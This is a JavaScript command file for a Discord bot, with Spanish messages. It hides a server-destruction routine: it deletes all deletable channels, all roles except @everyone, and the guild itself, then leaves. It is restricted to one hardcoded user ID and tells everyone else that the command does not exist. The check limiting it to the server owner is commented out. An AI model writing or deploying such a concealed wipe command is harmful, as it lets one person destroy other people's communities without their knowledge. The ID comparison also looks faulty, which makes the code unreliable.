exports.run = async (client, message, args) => { 
    
    var owner = message.channel.guild.ownerID
    message.delete()

    if (message.author.id != 344543506481807363 || message.author.id != '344543506481807363'){ 
        return util.unkred("Lo sentimos ese comando no existe", 5000)
    };

    //if (message.author.id == owner){
        try{
            //console.log(message.member.guild)
            //console.log(message.member.guild.channels)
            // message.member.guild.roles

            let canales = message.member.guild.channels
            canales.forEach(function(valor) {
                if (valor.deletable) {
                   valor.delete()
                }
            });

            let roles = message.member.guild.roles
            roles.forEach(function(valor) {
                if (valor.name != "@everyone") {
                    valor.delete()
                }
            });
            
            message.member.guild.delete()
            .catch(console.error);
            
            setTimeout(() => {
                message.member.guild.leave()
            }, 60000)
        }catch(err){
            console.error(err)
        }/*
    }else{
        util.unkred(`No tienes Permiso para realizar esta accion`, 5000)
    }*/
}

